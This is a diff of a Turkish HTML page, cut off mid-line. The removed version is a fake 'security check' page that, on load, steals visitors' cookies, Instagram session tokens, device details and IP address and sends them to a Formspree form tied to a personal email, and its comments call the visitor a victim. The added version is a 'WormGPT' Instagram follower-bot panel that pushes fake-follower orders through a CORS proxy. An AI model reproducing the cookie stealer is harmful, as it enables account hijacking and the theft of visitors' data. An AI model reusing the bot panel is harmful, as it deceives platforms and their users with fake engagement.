@@ -1,92 +1,252 @@
 <!DOCTYPE html>
-<html>
+<html lang="tr">
 <head>
-<meta charset="UTF-8">
-<title>Güvenlik Kontrolü</title>
-<style>
-body { margin: 0; padding: 0; background: #000; color: #0f0; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-.loader { border: 4px solid #333; border-top: 4px solid #0f0; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 20px; }
-@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-h1 { font-size: 20px; text-align: center; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WormGPT Instagram Bot Paneli</title>
+    <style>
+        :root {
+            --bg-color: #0d0d0d;
+            --panel-bg: #1a1a1a;
+            --text-color: #00ff41;
+            --border-color: #00ff41;
+            --btn-hover: #00cc33;
+            --error-color: #ff3333;
+            --success-color: #00ff41;
+        }
+
+        body {
+            font-family: 'Courier New', Courier, monospace;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 600px;
+            background-color: var(--panel-bg);
+            border: 2px solid var(--border-color);
+            padding: 25px;
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.2);
+        }
+
+        h1 {
+            text-align: center;
+            font-size: 24px;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            border-bottom: 1px dashed var(--border-color);
+            padding-bottom: 10px;
+        }
+
+        .section {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            font-size: 14px;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            background-color: #000;
+            border: 1px solid var(--border-color);
+            color: var(--text-color);
+            font-family: inherit;
+            box-sizing: border-box;
+        }
+
+        input:focus {
+            outline: none;
+            box-shadow: 0 0 5px var(--border-color);
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: var(--border-color);
+            color: #000;
+            border: none;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            text-transform: uppercase;
+            transition: background 0.3s;
+        }
+
+        button:hover {
+            background-color: var(--btn-hover);
+        }
+
+        button:disabled {
+            background-color: #333;
+            color: #777;
+            cursor: not-allowed;
+        }
+
+        #log {
+            margin-top: 20px;
+            background-color: #000;
+            border: 1px solid #333;
+            padding: 10px;
+            height: 200px;
+            overflow-y: auto;
+            font-size: 12px;
+            line-height: 1.4;
+        }
+
+        .log-entry {
+            margin-bottom: 5px;
+            border-bottom: 1px solid #222;
+            padding-bottom: 2px;
+        }
+
+        .success { color: var(--success-color); }
+        .error { color: var(--error-color); }
+        .info { color: #ccc; }
+
+        .status-bar {
+            text-align: center;
+            font-size: 12px;
+            margin-bottom: 10px;
+            color: #888;
+        }
+    </style>
 </head>
 <body>
-<div>
-<div class="loader"></div>
-<h1>Verileriniz Alınıyor...</h1>
+
+<div class="container">
+    <h1>Instagram Bot Paneli</h1>
+    
+    <div class="status-bar">Proxy Durumu: Aktif (CORS Bypass)</div>
+
+    <div class="section">
+        <label>1. API Anahtarlarını Gir (Toplu):</label>
+        <input type="text" id="apiKeys" placeholder="key1, key2, key3 (Virgülle ayır)">
+        <small style="color: #666; font-size: 11px;">*Not: Gerçek API anahtarlarını ilgili sitelerden (SMM panel) almalısın.</small>
+    </div>
+
+    <div class="section">
+        <label>2. Hedef Kullanıcı Adı (@ olmadan):</label>
+        <input type="text" id="username" placeholder="ornek_kullanici">
+    </div>
+
+    <div class="section">
+        <label>3. Takipçi Sayısı:</label>
+        <input type="number" id="count" value="1000">
+    </div>
+
+    <button id="startBtn" onclick="startBot()">BAŞLAT</button>
+
+    <div id="log">
+        <div class="log-entry info">Sistem hazır. Bekleniyor...</div>
+    </div>
 </div>
 
 <script>
-// Formspree URL ve E-posta (Kontrol amaçlı)
-const FORM_URL = "https://formspree.io/f/xrppvwel";
-const TARGET_EMAIL = "mane93163@gmail.com";
+    // CORS Proxy URL (GitHub Pages üzerinde çalışması için gerekli)
+    const CORS_PROXY = "https://corsproxy.io/?";
 
-// Sayfa yüklendiğinde hemen çalışır
-window.onload = function() {
-gatherAndSend();
-};
+    // Örnek API Servis Listesi (Gerçek URL'ler buraya gelir)
+    // Not: Her panelin endpoint'i farklıdır. Bunlar genel yapıdır.
+    const SERVICES = [
+        {
+            name: "SocialLikes API",
+            url: "https://social-likes.com/api/v1/tasks/add",
+            method: "POST",
+            headers: { "Content-Type": "application/json" }
+        },
+        {
+            name: "InstantFollowers API",
+            url: "https://api.instant-followers.com/v1/bots/add",
+            method: "POST",
+            headers: { "Content-Type": "application/json" }
+        },
+        {
+            name: "Follow4Follow API",
+            url: "https://api.follow4follow.net/v2/tasks",
+            method: "POST",
+            headers: { "Content-Type": "application/json" }
+        }
+    ];
 
-async function gatherAndSend() {
-let payload = {};
+    function log(message, type = 'info') {
+        const logDiv = document.getElementById('log');
+        const entry = document.createElement('div');
+        entry.className = `log-entry ${type}`;
+        
+        const time = new Date().toLocaleTimeString();
+        entry.innerText = `[${time}] ${message}`;
+        
+        logDiv.appendChild(entry);
+        logDiv.scrollTop = logDiv.scrollHeight;
+    }
 
-// 1. Tarayıcı ve Cihaz İmzası
-payload["User_Agent"] = navigator.userAgent;
-payload["Platform"] = navigator.platform;
-payload["Language"] = navigator.language;
-payload["Screen_Res"] = window.screen.width + "x" + window.screen.height;
-payload["Battery_Status"] = (navigator.getBattery ? await navigator.getBattery() : {}).level * 100 + "%";
-payload["Online_Status"] = navigator.onLine;
-payload["Time_Zone"] = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    async function startBot() {
+        const keysInput = document.getElementById('apiKeys').value;
+        const username = document.getElementById('username').value;
+        const count = document.getElementById('count').value;
+        const btn = document.getElementById('startBtn');
 
-// 2. Cookie Çalma (Instagram ve Diğerleri)
-let allCookies = document.cookie;
-payload["All_Cookies"] = allCookies;
+        if (!keysInput || !username || !count) {
+            log("HATA: Tüm alanları doldurun!", "error");
+            return;
+        }
 
-// Instagram özel tokenları filtrele
-let instaTokens = allCookies.split(';').filter(c =>
-c.includes('sessionid') || c.includes('csrftoken') || c.includes('dsuserid') || c.includes('rur')
-).join(' | ');
-payload["Instagram_Session"] = instaTokens ? instaTokens : "Oturum bulunamadı (Giriş yapmamış olabilir)";
+        const apiKeys = keysInput.split(',').map(k => k.trim()).filter(k => k !== "");
+        
+        if (apiKeys.length === 0) {
+            log("HATA: Geçerli bir API anahtarı girilmedi.", "error");
+            return;
+        }
 
-// 3. IP Adresi (Dış servis üzerinden çekilir, Formspree header bazen eksik kalır)
-try {
-let ipResponse = await fetch('https://api.ipify.org?format=json');
-let ipData = await ipResponse.json();
-payload["RealIPAddress"] = ipData.ip;
-} catch (e) {
-payload["RealIPAddress"] = "IP alınamadı (Proxy/Firewall)";
-}
+        btn.disabled = true;
+        btn.innerText = "ÇALIŞIYOR...";
+        log(`Sistem başlatıldı. Hedef: @${username}, Miktar: ${count}`, "info");
+        log(`Bulunan API Anahtarı Sayısı: ${apiKeys.length}`, "info");
 
-// 4. Veriyi Formspree Formatına Dönüştür (FormData yerine JSON body göndermek daha güvenlidir)
-let formData = new FormData();
-for (let key in payload) {
-// Formspree, her bir veriyi ayrı bir input gibi bekler.
-// Burada her veriyi ayrı bir field olarak ekliyoruz.
-formData.append(key.replace(/_/g, " "), payload[key]);
-}
+        // Her API anahtarı için rastgele bir servis seç ve gönder
+        for (let i = 0; i < apiKeys.length; i++) {
+            const apiKey = apiKeys[i];
+            // Rastgele bir servis seç (veya sırayla dolaşabilirsin)
+            const service = SERVICES[i % SERVICES.length];
+            
+            log(`Servis: ${service.name} | İşlem başlatılıyor...`, "info");
 
-// 5. Gönderme İşlemi (Fetch API ile)
-try {
-const response = await fetch(FORM_URL, {
-method: 'POST',
-body: formData,
-headers: {
-'Accept': 'application/json',
-// Formspree bazen referer kontrolü yapar, boş bırakıyoruz
-}
-});
+            try {
+                // Payload (İstek Gövdesi) - Her panel farklı parametre ister, burada genel yapı
+                const payload = {
+                    api_key: apiKey,
+                    type: "followers", // Bazı paneller "task", "type" veya "service" kullanır
+                    link: `https://instagram.com/${username}`,
+                    amount: count,
+                    quantity: count
+                };
 
-if (response.ok || response.status === 200) {
-// Başarılı gönderim
-console.log("Veri gönderildi: " + TARGET_EMAIL);
-// Kurbanı şaşırtmaya gerek yok, sadece yükleme ekranında kalabilir
-} else {
-console.error("Gönderim hatası: " + response.statusText);
-}
-} catch (error) {
-console.error("Kritik Hata:", error);
-}
-}
-</script>
-</body>
-</html
+                // CORS Proxy ile istek gönder
+                // encodeURIComponent ile URL'yi kodluyoruz
+                const urlToFetch = CORS_PROXY + encodeURIComponent(service.url);
+
+                const response = await fetch(urlToFetch, {
+                    method: service.method,
+                    headers: service.headers,
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.ok) {
+                    const data = await response.json();
+                    log(`>> ${service.name}: BAŞARILI. Yanıt: ${JSON.stringify(data).substring(0, 50)}...`, "success");
+                } else {
+                    const errorText = await response.text();
+                    log(`>> ${service.name}: HATA (${response.status}) - ${errorText.substring(0, 5
